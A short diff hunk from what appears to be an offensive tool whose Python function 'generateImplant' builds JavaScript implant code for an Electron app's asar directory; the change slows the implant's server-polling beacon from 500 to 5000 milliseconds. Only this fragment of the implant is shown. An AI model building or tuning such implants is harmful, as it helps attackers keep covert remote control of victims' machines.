@@ -190,7 +190,7 @@ def generateImplant(ip, port, asarDir):
         req.end();
     }}
 
-    setInterval(pollServer, 500);
+    setInterval(pollServer, 5000);
     """
 
     return implantCode
